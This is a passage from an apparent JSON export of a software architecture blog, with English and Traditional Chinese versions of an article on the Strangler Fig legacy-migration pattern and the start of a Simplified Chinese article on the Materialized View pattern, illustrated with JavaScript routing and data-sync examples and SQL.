(context.user.segment &#x3D;&#x3D;&#x3D; &#39;premium&#39;) &#123; return true; &#125; &#125; return false; &#125; isInPercentage(userId, percentage) &#123; const hash &#x3D; this.hashUserId(userId); return (hash % 100) &lt; percentage; &#125; &#125; 3. Data Consistency Management Handle the dual-write problem: class ConsistencyManager &#123; async writeWithConsistency(data) &#123; &#x2F;&#x2F; Write to new system first const newResult &#x3D; await newSystem.write(data); try &#123; &#x2F;&#x2F; Sync to legacy await legacySystem.write(this.transform(data)); &#125; catch (error) &#123; &#x2F;&#x2F; Queue for retry await this.retryQueue.add(&#123; data, target: &#39;legacy&#39;, timestamp: Date.now() &#125;); &#125; return newResult; &#125; async reconcile() &#123; &#x2F;&#x2F; Periodic consistency checks const discrepancies &#x3D; await this.findDiscrepancies(); for (const item of discrepancies) &#123; await this.resolveConflict(item); &#125; &#125; &#125; When to Use This Approach Ideal Scenarios ✅ Perfect Use CasesLarge Legacy Systems: When the system is too large or complex for a complete rewrite. Business Continuity Required: When you can't afford downtime or service interruption. Uncertain Requirements: When you're not entirely sure what the new system should look like. Risk Mitigation: When you need to minimize the risk of migration failure. Real-World Examples E-commerce Platform Migration Start with product catalog Move to search functionality Migrate checkout process Finally replace order management Banking System Modernization Begin with customer portal Migrate account services Update transaction processing Replace core banking last Content Management System Modernize content delivery Upgrade authoring tools Migrate asset management Replace workflow engine When to Avoid ❌ Not Suitable WhenSmall Systems: When a complete rewrite is simpler and faster. No Interception Point: When you can't introduce a façade or proxy layer. Urgent Replacement: When the legacy system must be decommissioned immediately for compliance or security reasons. Simple Architecture: When the system is straightforward enough that incremental migration adds unnecessary complexity. Architectural Quality Attributes Reliability Strangler Fig improves reliability during migration: Gradual Risk Introduction: Each change is small and reversible Fallback Capability: Can revert to legacy if new features fail Continuous Operation: System remains functional throughout migration class ReliabilityHandler &#123; async handleWithFallback(request) &#123; try &#123; return await newSystem.handle(request); &#125; catch (error) &#123; logger.warn(&#39;New system failed, falling back&#39;, error); return await legacySystem.handle(request); &#125; &#125; &#125; Cost Optimization While running dual systems has costs, the approach optimizes long-term investment: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_e305936c5')); var option = { \"title\": { \"text\": \"Cost Comparison: Big Bang vs. Strangler Fig\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Big Bang Rewrite\", \"Strangler Fig\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Month 1\", \"Month 3\", \"Month 6\", \"Month 9\", \"Month 12\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Cost\" }, \"series\": [ { \"name\": \"Big Bang Rewrite\", \"type\": \"line\", \"data\": [100, 100, 100, 100, 150], \"itemStyle\": { \"color\": \"#fa5252\" }, \"lineStyle\": { \"type\": \"dashed\" } }, { \"name\": \"Strangler Fig\", \"type\": \"line\", \"data\": [20, 40, 60, 80, 100], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); Cost Benefits: Spread investment over time Deliver value incrementally Avoid “all or nothing” risk Maximize use of existing system Operational Excellence The incremental approach supports continuous improvement: Small, Safe Changes: Each migration step is manageable Learning Opportunities: Lessons from early migrations inform later ones Team Adaptation: Teams gradually build expertise with new technology Continuous Delivery: New features can be released during migration Complete Implementation Example Here’s a comprehensive implementation for an API gateway façade: class StranglerFigGateway &#123; constructor(config) &#123; this.legacy &#x3D; new LegacySystemClient(config.legacy); this.modern &#x3D; new ModernSystemClient(config.modern); this.features &#x3D; new FeatureToggleService(config.features); this.monitor &#x3D; new MonitoringService(config.monitoring); this.cache &#x3D; new CacheService(config.cache); &#125; async handleRequest(req, res) &#123; const startTime &#x3D; Date.now(); const route &#x3D; this.determineRoute(req); try &#123; let response; &#x2F;&#x2F; Check cache first const cacheKey &#x3D; this.getCacheKey(req); const cached &#x3D; await this.cache.get(cacheKey); if (cached) &#123; response &#x3D; cached; &#125; else &#123; &#x2F;&#x2F; Route to appropriate system if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; response &#x3D; await this.modern.handle(req); &#125; else &#123; response &#x3D; await this.legacy.handle(req); &#125; &#x2F;&#x2F; Cache if appropriate if (route.cacheable) &#123; await this.cache.set(cacheKey, response, route.ttl); &#125; &#125; &#x2F;&#x2F; Record metrics this.monitor.recordRequest(&#123; target: route.target, duration: Date.now() - startTime, status: &#39;success&#39; &#125;); return res.json(response); &#125; catch (error) &#123; &#x2F;&#x2F; Fallback logic if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39; &amp;&amp; route.fallbackEnabled) &#123; try &#123; const fallbackResponse &#x3D; await this.legacy.handle(req); this.monitor.recordRequest(&#123; target: &#39;legacy-fallback&#39;, duration: Date.now() - startTime, status: &#39;fallback&#39; &#125;); return res.json(fallbackResponse); &#125; catch (fallbackError) &#123; this.monitor.recordError(fallbackError); return res.status(500).json(&#123; error: &#39;Service unavailable&#39; &#125;); &#125; &#125; this.monitor.recordError(error); return res.status(500).json(&#123; error: error.message &#125;); &#125; &#125; determineRoute(req) &#123; &#x2F;&#x2F; API version-based routing if (req.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: true, ttl: 300 &#125;; &#125; &#x2F;&#x2F; Feature flag-based routing const feature &#x3D; this.extractFeature(req.path); if (this.features.isEnabled(feature, req.user)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: false &#125;; &#125; &#x2F;&#x2F; Default to legacy return &#123; target: &#39;legacy&#39;, fallbackEnabled: false, cacheable: true, ttl: 600 &#125;; &#125; extractFeature(path) &#123; const pathMap &#x3D; &#123; &#39;&#x2F;products&#39;: &#39;new-catalog&#39;, &#39;&#x2F;search&#39;: &#39;new-search&#39;, &#39;&#x2F;checkout&#39;: &#39;new-checkout&#39;, &#39;&#x2F;orders&#39;: &#39;new-orders&#39; &#125;; for (const [prefix, feature] of Object.entries(pathMap)) &#123; if (path.startsWith(prefix)) &#123; return feature; &#125; &#125; return null; &#125; getCacheKey(req) &#123; return &#96;$&#123;req.method&#125;:$&#123;req.path&#125;:$&#123;JSON.stringify(req.query)&#125;&#96;; &#125; &#125; Migration Monitoring Track progress and health: class MigrationDashboard &#123; async getMetrics() &#123; return &#123; trafficDistribution: await this.getTrafficSplit(), featureMigrationStatus: await this.getFeatureStatus(), errorRates: await this.getErrorRates(), performanceComparison: await this.getPerformanceMetrics() &#125;; &#125; async getTrafficSplit() &#123; const total &#x3D; await this.monitor.getTotalRequests(); const modern &#x3D; await this.monitor.getModernRequests(); return &#123; legacy: ((total - modern) &#x2F; total * 100).toFixed(1), modern: (modern &#x2F; total * 100).toFixed(1) &#125;; &#125; async getFeatureStatus() &#123; return &#123; completed: [&#39;product-catalog&#39;, &#39;search&#39;, &#39;user-auth&#39;], inProgress: [&#39;checkout&#39;, &#39;order-management&#39;], pending: [&#39;inventory&#39;, &#39;reporting&#39;, &#39;admin-panel&#39;] &#125;; &#125; &#125; Trade-offs and Challenges Like any architectural approach, Strangler Fig involves trade-offs: ⚠️ Challenges to AddressDual System Overhead: Running both systems simultaneously increases infrastructure costs and operational complexity. Data Synchronization: Keeping data consistent across systems is challenging and error-prone. Extended Timeline: Migration takes longer than a rewrite, which can be frustrating for stakeholders. Façade Complexity: The routing layer can become complex and difficult to maintain as migration progresses. Mitigation Strategies: Set clear migration milestones and celebrate progress Automate data synchronization and validation Keep façade logic simple with clear routing rules Monitor costs and optimize infrastructure usage Plan for façade removal from the beginning Related Patterns and Strategies Strangler Fig works well with other architectural approaches: Branch by Abstraction: Similar incremental approach but at the code level rather than system level Parallel Run: Run both systems simultaneously to validate new system behavior Blue-Green Deployment: Use for final cutover when migration is complete Feature Toggles: Essential for controlling which features route to new system Anti-Corruption Layer: Protect new system from legacy system’s design decisions Conclusion Whether you call it a pattern or a strategy, Strangler Fig provides a pragmatic approach to one of software engineering’s most challenging problems: evolving legacy systems without disrupting business operations. The key insights: Incremental beats revolutionary: Small, safe changes reduce risk Façade enables flexibility: The proxy layer gives you control over the migration Business continuity is paramount: The system remains operational throughout Learn as you go: Early migrations inform later decisions Success with Strangler Fig requires patience, discipline, and clear communication. It’s not the fastest approach, but it’s often the safest and most reliable way to modernize complex systems. The pattern vs. strategy debate is ultimately academic. What matters is that Strangler Fig gives teams a proven framework for tackling legacy system migration with confidence. It transforms an overwhelming challenge into a series of manageable steps, each delivering value while moving toward the ultimate goal of a modern, maintainable system. References Martin Fowler: StranglerFigApplication Strangler Fig Pattern Sam Newman: Monolith to Microservices","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"Strangler Fig 模式：模式還是策略？","slug":"2019/06/Strangler-Fig-Pattern-zh-TW","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-TW/2019/06/Strangler-Fig-Pattern/","permalink":"https://neo01.com/zh-TW/2019/06/Strangler-Fig-Pattern/","excerpt":"透過逐步替換功能來增量遷移舊系統。但 Strangler Fig 真的是一個模式，還是一種遷移策略？讓我們探索這個架構方法及其哲學分類。","text":"當面對一個難以維護的舊系統時，從頭重寫一切的誘惑很強烈。然而，歷史告訴我們，「大爆炸」式的重寫往往會慘敗。Strangler Fig 模式提供了一個更務實的方法：逐步替換舊系統的每一部分，直到什麼都不剩。 但這裡有一個有趣的問題：Strangler Fig 真的是傳統意義上的「模式」，還是更準確地說是一種遷移「策略」？讓我們探索實際實現和這個哲學區別。 起源故事 這個名字來自熱帶雨林中的絞殺榕樹。這些樹以種子的形式沉積在宿主樹上開始生命。隨著它們生長，它們將根向下延伸到地面，並逐漸包圍宿主樹。最終，宿主樹死亡並分解，留下無花果樹獨立站立——這是系統遷移的完美隱喻。 核心概念 Strangler Fig 提供了一種增量的現代化方法。與其一次性替換整個系統，你可以： 引入門面（代理），位於客戶端和舊系統之間 逐步在現代系統中實現新功能 智能路由請求在新舊系統之間 停用舊系統，一旦所有功能都已遷移 移除門面，當遷移完成時 graph LR A[客戶端] --> B[門面/代理] B -->|舊功能| C[舊系統] B -->|新功能| D[新系統] C --> E[(舊資料庫)] D --> F[(新資料庫)] style B fill:#ffd43b,stroke:#fab005 style C fill:#fa5252,stroke:#c92a2a style D fill:#51cf66,stroke:#2f9e44 運作方式：實際旅程 讓我們走過一個具體的例子：將電子商務平台從單體架構遷移到微服務。 階段 1：建立門面 第一步是引入一個可以引導流量的路由層： class StranglerFacade &#123; constructor(legacySystem, newSystem) &#123; this.legacy &#x3D; legacySystem; this.modern &#x3D; newSystem; this.featureFlags &#x3D; new FeatureToggleService(); &#125; async handleRequest(request) &#123; const route &#x3D; this.determineRoute(request); if (route &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; return await this.modern.handle(request); &#125; return await this.legacy.handle(request); &#125; determineRoute(request) &#123; &#x2F;&#x2F; 基於功能標誌、使用者區段或端點進行路由 if (this.featureFlags.isEnabled(&#39;new-checkout&#39;, request.user)) &#123; return &#39;modern&#39;; &#125; if (request.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#39;modern&#39;; &#125; return &#39;legacy&#39;; &#125; &#125; 階段 2：增量遷移 從低風險、高價值的功能開始： &#x2F;&#x2F; 第 1 週：遷移產品搜尋 app.get(&#39;&#x2F;search&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有更好性能的新搜尋服務 const results &#x3D; await newSearchService.search(req.query); res.json(results); &#125;); &#x2F;&#x2F; 第 4 週：遷移使用者認證 app.post(&#39;&#x2F;login&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有現代安全性的新認證服務 const token &#x3D; await newAuthService.authenticate(req.body); res.json(&#123; token &#125;); &#125;); &#x2F;&#x2F; 第 8 週：遷移結帳流程 app.post(&#39;&#x2F;checkout&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 具有改進 UX 的新結帳 const order &#x3D; await newCheckoutService.process(req.body); res.json(order); &#125;); 階段 3：處理資料遷移 最棘手的方面之一是管理兩個系統之間的資料： graph TD A[客戶端請求] --> B[門面] B --> C{哪個系統？} C -->|新功能| D[新服務] C -->|舊功能| E[舊服務] D --> F[寫入新資料庫] D --> G[同步到舊資料庫] E --> H[寫入舊資料庫] E --> I[同步到新資料庫] style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 style E fill:#fa5252,stroke:#c92a2a class DataSyncService &#123; async syncOrder(order) &#123; &#x2F;&#x2F; 寫入新系統 await newDatabase.orders.create(order); &#x2F;&#x2F; 同步到仍在使用它的舊功能 await legacyDatabase.orders.create(this.transformToLegacy(order)); &#125; async migrateHistoricalData() &#123; &#x2F;&#x2F; 批次遷移現有資料 const legacyOrders &#x3D; await legacyDatabase.orders.findAll(); for (const order of legacyOrders) &#123; const modernOrder &#x3D; this.transformToModern(order); await newDatabase.orders.create(modernOrder); &#125; &#125; &#125; 階段 4：完成遷移 一旦所有功能都已遷移： &#x2F;&#x2F; 之前：門面路由 app.use(stranglerFacade.middleware()); &#x2F;&#x2F; 之後：直接路由到新系統 app.use(newSystem.middleware()); &#x2F;&#x2F; 停用舊系統 await legacySystem.shutdown(); await legacyDatabase.archive(); 模式 vs. 策略：哲學辯論 這裡事情變得有趣了。Strangler Fig 是「模式」還是「策略」？ 「模式」的論點 📐 模式特徵結構化解決方案：Strangler Fig 定義了一個特定的結構（門面 + 雙系統），解決了一個反覆出現的問題。 可重用範本：這種方法可以應用於不同的技術和領域。 命名解決方案：它為討論增量遷移提供了共同的詞彙。 傳統的設計模式（如四人幫書中的那些）描述了反覆出現問題的結構化解決方案。Strangler Fig 符合這個定義——它規定了一個特定的架構結構（門面）和一個清晰的流程。 「策略」的論點 🎯 策略特徵高層次方法：它更多的是關於整體遷移哲學，而不是具體的實現細節。 靈活實現：實際結構根據上下文有很大差異。 流程導向：它描述了一系列隨時間推移的行動，而不僅僅是靜態結構。 策略是實現目標的更廣泛方法。Strangler Fig 從根本上是關於如何進行遷移——關於風險管理和變更管理的策略決策。 結論：兩者兼具 ✅ 混合分類Strangler Fig 是一個策略模式——它結合了模式的結構特異性和策略的高層次指導。 它是一個模式，因為它規定了特定的架構組件（門面）。 它是一個策略，因為它指導了系統隨時間演化的整體方法。 也許這種區別不如它提供的價值重要。無論你稱它為模式還是策略，Strangler Fig 都為軟體工程最困難的問題之一提供了經過驗證的方法：安全地演化舊系統。 實現考量 1. 門面設計 門面是你的控制中心。仔細設計它： class IntelligentFacade &#123; constructor() &#123; this.router &#x3D; new SmartRouter(); this.monitor &#x3D; new MigrationMonitor(); this.fallback &#x3D; new FallbackHandler(); &#125; async route(request) &#123; try &#123; const target &#x3D; this.router.determineTarget(request); const response &#x3D; await target.handle(request); &#x2F;&#x2F; 監控成功率 this.monitor.recordSuccess(target.name); return response; &#125; catch (error) &#123; &#x2F;&#x2F; 錯誤時回退到舊系統 this.monitor.recordFailure(target.name); return await this.fallback.handleWithLegacy(request); &#125; &#125; &#125; ⚠️ 門面風險單點故障：門面成為關鍵基礎設施。確保高可用性。 性能瓶頸：每個請求都通過門面。仔細優化。 複雜性增長：隨著遷移進展，路由邏輯可能變得複雜。保持可維護性。 2. 功能切換策略 使用功能標誌來控制遷移： class FeatureToggleService &#123; isEnabled(feature, context) &#123; &#x2F;&#x2F; 逐步推出 if (feature &#x3D;&#x3D;&#x3D; &#39;new-checkout&#39;) &#123; &#x2F;&#x2F; 10% 的使用者 if (this.isInPercentage(context.userId, 10)) &#123; return true; &#125; &#x2F;&#x2F; Beta 測試者 if (context.user.isBetaTester) &#123; return true; &#125; &#x2F;&#x2F; 特定使用者區段 if (context.user.segment &#x3D;&#x3D;&#x3D; &#39;premium&#39;) &#123; return true; &#125; &#125; return false; &#125; isInPercentage(userId, percentage) &#123; const hash &#x3D; this.hashUserId(userId); return (hash % 100) &lt; percentage; &#125; &#125; 3. 資料一致性管理 處理雙寫問題： class ConsistencyManager &#123; async writeWithConsistency(data) &#123; &#x2F;&#x2F; 首先寫入新系統 const newResult &#x3D; await newSystem.write(data); try &#123; &#x2F;&#x2F; 同步到舊系統 await legacySystem.write(this.transform(data)); &#125; catch (error) &#123; &#x2F;&#x2F; 排隊重試 await this.retryQueue.add(&#123; data, target: &#39;legacy&#39;, timestamp: Date.now() &#125;); &#125; return newResult; &#125; async reconcile() &#123; &#x2F;&#x2F; 定期一致性檢查 const discrepancies &#x3D; await this.findDiscrepancies(); for (const item of discrepancies) &#123; await this.resolveConflict(item); &#125; &#125; &#125; 何時使用此方法 理想場景 ✅ 完美使用案例大型舊系統：當系統太大或太複雜而無法完全重寫時。 需要業務連續性：當你無法承受停機或服務中斷時。 需求不確定：當你不完全確定新系統應該是什麼樣子時。 風險緩解：當你需要最小化遷移失敗的風險時。 真實世界範例 電子商務平台遷移 從產品目錄開始 移至搜尋功能 遷移結帳流程 最後替換訂單管理 銀行系統現代化 從客戶入口網站開始 遷移帳戶服務 更新交易處理 最後替換核心銀行系統 內容管理系統 現代化內容交付 升級編輯工具 遷移資產管理 替換工作流程引擎 何時避免 ❌ 不適合的情況小型系統：當完全重寫更簡單、更快時。 無攔截點：當你無法引入門面或代理層時。 緊急替換：當舊系統必須因合規或安全原因立即停用時。 簡單架構：當系統足夠簡單，增量遷移會增加不必要的複雜性時。 架構品質屬性 可靠性 Strangler Fig 在遷移期間提高可靠性： 逐步引入風險：每個變更都很小且可逆 回退能力：如果新功能失敗，可以恢復到舊系統 持續運作：系統在整個遷移過程中保持功能 class ReliabilityHandler &#123; async handleWithFallback(request) &#123; try &#123; return await newSystem.handle(request); &#125; catch (error) &#123; logger.warn(&#39;新系統失敗，回退中&#39;, error); return await legacySystem.handle(request); &#125; &#125; &#125; 成本優化 雖然運行雙系統有成本，但這種方法優化了長期投資： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_964e11432')); var option = { \"title\": { \"text\": \"成本比較：大爆炸 vs. Strangler Fig\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"大爆炸重寫\", \"Strangler Fig\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第 1 個月\", \"第 3 個月\", \"第 6 個月\", \"第 9 個月\", \"第 12 個月\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"成本\" }, \"series\": [ { \"name\": \"大爆炸重寫\", \"type\": \"line\", \"data\": [100, 100, 100, 100, 150], \"itemStyle\": { \"color\": \"#fa5252\" }, \"lineStyle\": { \"type\": \"dashed\" } }, { \"name\": \"Strangler Fig\", \"type\": \"line\", \"data\": [20, 40, 60, 80, 100], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 成本優勢： 隨時間分散投資 增量交付價值 避免「全有或全無」風險 最大化現有系統的使用 卓越營運 增量方法支持持續改進： 小型、安全的變更：每個遷移步驟都是可管理的 學習機會：早期遷移為後期提供資訊 團隊適應：團隊逐步建立新技術的專業知識 持續交付：在遷移期間可以發布新功能 完整實現範例 這是一個 API 閘道門面的全面實現： class StranglerFigGateway &#123; constructor(config) &#123; this.legacy &#x3D; new LegacySystemClient(config.legacy); this.modern &#x3D; new ModernSystemClient(config.modern); this.features &#x3D; new FeatureToggleService(config.features); this.monitor &#x3D; new MonitoringService(config.monitoring); this.cache &#x3D; new CacheService(config.cache); &#125; async handleRequest(req, res) &#123; const startTime &#x3D; Date.now(); const route &#x3D; this.determineRoute(req); try &#123; let response; &#x2F;&#x2F; 首先檢查快取 const cacheKey &#x3D; this.getCacheKey(req); const cached &#x3D; await this.cache.get(cacheKey); if (cached) &#123; response &#x3D; cached; &#125; else &#123; &#x2F;&#x2F; 路由到適當的系統 if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39;) &#123; response &#x3D; await this.modern.handle(req); &#125; else &#123; response &#x3D; await this.legacy.handle(req); &#125; &#x2F;&#x2F; 如果適當則快取 if (route.cacheable) &#123; await this.cache.set(cacheKey, response, route.ttl); &#125; &#125; &#x2F;&#x2F; 記錄指標 this.monitor.recordRequest(&#123; target: route.target, duration: Date.now() - startTime, status: &#39;success&#39; &#125;); return res.json(response); &#125; catch (error) &#123; &#x2F;&#x2F; 回退邏輯 if (route.target &#x3D;&#x3D;&#x3D; &#39;modern&#39; &amp;&amp; route.fallbackEnabled) &#123; try &#123; const fallbackResponse &#x3D; await this.legacy.handle(req); this.monitor.recordRequest(&#123; target: &#39;legacy-fallback&#39;, duration: Date.now() - startTime, status: &#39;fallback&#39; &#125;); return res.json(fallbackResponse); &#125; catch (fallbackError) &#123; this.monitor.recordError(fallbackError); return res.status(500).json(&#123; error: &#39;服務不可用&#39; &#125;); &#125; &#125; this.monitor.recordError(error); return res.status(500).json(&#123; error: error.message &#125;); &#125; &#125; determineRoute(req) &#123; &#x2F;&#x2F; 基於 API 版本的路由 if (req.path.startsWith(&#39;&#x2F;api&#x2F;v2&#x2F;&#39;)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: true, ttl: 300 &#125;; &#125; &#x2F;&#x2F; 基於功能標誌的路由 const feature &#x3D; this.extractFeature(req.path); if (this.features.isEnabled(feature, req.user)) &#123; return &#123; target: &#39;modern&#39;, fallbackEnabled: true, cacheable: false &#125;; &#125; &#x2F;&#x2F; 預設為舊系統 return &#123; target: &#39;legacy&#39;, fallbackEnabled: false, cacheable: true, ttl: 600 &#125;; &#125; extractFeature(path) &#123; const pathMap &#x3D; &#123; &#39;&#x2F;products&#39;: &#39;new-catalog&#39;, &#39;&#x2F;search&#39;: &#39;new-search&#39;, &#39;&#x2F;checkout&#39;: &#39;new-checkout&#39;, &#39;&#x2F;orders&#39;: &#39;new-orders&#39; &#125;; for (const [prefix, feature] of Object.entries(pathMap)) &#123; if (path.startsWith(prefix)) &#123; return feature; &#125; &#125; return null; &#125; getCacheKey(req) &#123; return &#96;$&#123;req.method&#125;:$&#123;req.path&#125;:$&#123;JSON.stringify(req.query)&#125;&#96;; &#125; &#125; 遷移監控 追蹤進度和健康狀況： class MigrationDashboard &#123; async getMetrics() &#123; return &#123; trafficDistribution: await this.getTrafficSplit(), featureMigrationStatus: await this.getFeatureStatus(), errorRates: await this.getErrorRates(), performanceComparison: await this.getPerformanceMetrics() &#125;; &#125; async getTrafficSplit() &#123; const total &#x3D; await this.monitor.getTotalRequests(); const modern &#x3D; await this.monitor.getModernRequests(); return &#123; legacy: ((total - modern) &#x2F; total * 100).toFixed(1), modern: (modern &#x2F; total * 100).toFixed(1) &#125;; &#125; async getFeatureStatus() &#123; return &#123; completed: [&#39;product-catalog&#39;, &#39;search&#39;, &#39;user-auth&#39;], inProgress: [&#39;checkout&#39;, &#39;order-management&#39;], pending: [&#39;inventory&#39;, &#39;reporting&#39;, &#39;admin-panel&#39;] &#125;; &#125; &#125; 權衡與挑戰 像任何架構方法一樣，Strangler Fig 涉及權衡： ⚠️ 需要解決的挑戰雙系統開銷：同時運行兩個系統會增加基礎設施成本和營運複雜性。 資料同步：在系統之間保持資料一致性具有挑戰性且容易出錯。 延長時間線：遷移比重寫需要更長時間，這可能讓利害關係人感到沮喪。 門面複雜性：隨著遷移進展，路由層可能變得複雜且難以維護。 緩解策略： 設定明確的遷移里程碑並慶祝進展 自動化資料同步和驗證 使用清晰的路由規則保持門面邏輯簡單 監控成本並優化基礎設施使用 從一開始就計劃移除門面 相關模式和策略 Strangler Fig 與其他架構方法配合良好： Branch by Abstraction：類似的增量方法，但在程式碼層級而非系統層級 Parallel Run：同時運行兩個系統以驗證新系統行為 Blue-Green Deployment：在遷移完成時用於最終切換 Feature Toggles：對於控制哪些功能路由到新系統至關重要 Anti-Corruption Layer：保護新系統免受舊系統設計決策的影響 結論 無論你稱它為模式還是策略，Strangler Fig 都為軟體工程最具挑戰性的問題之一提供了務實的方法：在不中斷業務運作的情況下演化舊系統。 關鍵見解： 增量勝過革命：小型、安全的變更降低風險 門面實現靈活性：代理層讓你控制遷移 業務連續性至關重要：系統在整個過程中保持運作 邊做邊學：早期遷移為後期決策提供資訊 使用 Strangler Fig 取得成功需要耐心、紀律和清晰的溝通。這不是最快的方法，但通常是現代化複雜系統最安全、最可靠的方式。 模式 vs. 策略的辯論最終是學術性的。重要的是 Strangler Fig 為團隊提供了一個經過驗證的框架，讓他們有信心地處理舊系統遷移。它將一個壓倒性的挑戰轉化為一系列可管理的步驟，每個步驟都在朝著現代化、可維護系統的最終目標前進的同時交付價值。 參考資料 Martin Fowler: StranglerFigApplication Strangler Fig Pattern Sam Newman: Monolith to Microservices","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"Materialized View 模式：通过预先计算的数据优化查询性能","slug":"2019/05/Materialized-View-Pattern-zh-CN","date":"un11fin11","updated":"un22fin22","comments":true,"path":"/zh-CN/2019/05/Materialized-View-Pattern/","permalink":"https://neo01.com/zh-CN/2019/05/Materialized-View-Pattern/","excerpt":"了解 Materialized View 模式如何通过预先计算并以特定查询优化的格式存储数据来提升查询性能，以及它与数据库 materialized view 的差异。","text":"当你走进图书馆时，你不会期望图书管理员在每次你询问特定类型的书籍时，都重新整理所有的书。相反，图书馆维护着一个目录——一个预先计算的索引，让找书变得快速且高效。Materialized View 模式将同样的原则应用于数据系统：在问题被提出之前就准备好答案。 问题：存储格式 vs. 查询需求 当开发人员和数据管理员设计数据存储时，他们通常专注于数据如何被写入和维护，而非如何被读取。这完全合理——存储格式针对以下方面进行优化： 数据完整性：确保一致性并避免重复 写入效率：快速插入和更新 存储优化：最小化空间使用 关联管理：维护实体之间的连接 然而，这种存储优先的方法经常与查询需求产生不匹配。考虑一个电子商务系统，将订单存储在规范化的关系型数据库中，或作为文档聚合存储在 NoSQL 存储中。虽然这种结构对于记录交易运作良好，但当你需要回答以下问题时就会出现问题： “本月各产品类别的总销售额是多少？” “哪些客户的终身价值最高？” “各地区的平均订单处理时间是多少？” ⚠️ 查询性能问题要回答这些问题，系统必须扫描数千条记录，执行复杂的联结或聚合，并实时计算数值。这个过程消耗大量资源和时间，特别是随着数据量增长。 解决方案：预先计算并存储查询结果 Materialized View 模式通过生成并存储针对特定查询优化格式的数据来解决这个挑战。系统不再每次查询执行时都计算结果，而是： 识别常见的查询模式，这些模式需要复杂的计算 预先计算结果，通过转换源数据 存储结果，以优化快速检索的格式 更新视图，当源数据变更时 graph LR A[源数据存储] -->|转换与聚合| B[Materialized View] C[应用程序查询] -->|快速读取| B A -->|数据变更| D[更新程序] D -->|刷新| B style B fill:#51cf66,stroke:#2f9e44 style A fill:#4dabf7,stroke:#1971c2 关键洞察：materialized view 是完全可抛弃的。它可以完全从源数据重建，使其成为一种特殊形式的缓存，存储计算结果而非原始数据。 数据库 Materialized View vs. 此模式 在深入探讨之前，让我们厘清一个重要的区别：数据库 materialized view 和 Materialized View 模式是相关但不同的概念。 数据库 Materialized View 许多关系型数据库（PostgreSQL、Oracle、SQL Server）提供内置的 materialized view 功能： -- 数据库 materialized view 示例 CREATE MATERIALIZED VIEW sales_summary AS SELECT product_category, SUM(order_total) as total_sales, COUNT(DISTINCT customer_id) as customer_count FROM orders JOIN order_items ON orders.id &#x3D; order_items.order_id JOIN products ON order_items.product_id &#x3D; products.id GROUP BY product_category; -- 刷新视图 REFRESH MATERIALIZED VIEW sales_summary; 特性： 由数据库引擎管理 存储在同一个数据库内 使用数据库特定的刷新机制 通常支持增量更新 限于单一数据库范围 Materialized View 模式 架构模式将这个概念扩展到数据库边界之外： &#x2F;&#x2F; 模式实现示例 class MaterializedViewService &#123; async updateSalesSummary() &#123; &#x2F;&#x2F; 从多个源读取 const orders &#x3D; await orderDatabase.query(&#39;SELECT * FROM orders&#39;); const customers &#x3D; await customerDatabase.query(&#39;SELECT * FROM customers&#39;); const products &#x3D; await productCatalog.getAll(); &#x2F;&#x2F; 转换和聚合 const summary &#x3D; this.computeSummary(orders, customers, products); &#x2F;&#x2F; 以优化格式存储 await viewStore.save(&#39;sales_summary&#39;, summary); &#125; async getSalesSummary() &#123; return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; 特性： 应用程序管理的逻辑 可以聚合来自多个源的数据 存储在任何数据存储中（与源不同） 灵活的更新策略 跨分布式系统运作 主要差异 方面 数据库 Materialized View Materialized View 模式 范围 单一数据库 多个数据源 管理 数据库引擎 应用程序代码 存储 同一个数据库 任何数据存储 技术 数据库特定 技术无关 使用案例 数据库内查询优化 跨系统数据聚合 📊 何时使用哪一种使用数据库 materialized view，当在单一数据库系统内优化查询时。 使用 Materialized View 模式，当跨多个系统、微服务或异构数据存储聚合数据时。 运作方式：模式实践 让我们探索一个具体示例：一个需要显示产品销售摘要的电子商务平台。 源数据结构 系统将数据存储在针对不同目的优化的独立位置： &#x2F;&#x2F; 订单存储在事务数据库 &#123; orderId: &quot;ORD-12345&quot;, customerId: &quot;CUST-789&quot;, orderDate: &quot;2019-05-15&quot;, items: [ &#123; productId: &quot;PROD-001&quot;, quantity: 2, price: 29.99 &#125;, &#123; productId: &quot;PROD-002&quot;, quantity: 1, price: 49.99 &#125; ] &#125; &#x2F;&#x2F; 产品存储在目录服务 &#123; productId: &quot;PROD-001&quot;, name: &quot;无线鼠标&quot;, category: &quot;电子产品&quot; &#125; &#x2F;&#x2F; 客户存储在 CRM 系统 &#123; customerId: &quot;CUST-789&quot;, name: &quot;张三&quot;, segment: &quot;高级会员&quot; &#125; Materialized View 结构 视图将这些数据组合并转换为查询优化格式： &#x2F;&#x2F; 销售摘要的 materialized view &#123; category: &quot;电子产品&quot;, totalSales: 109.97, orderCount: 1, 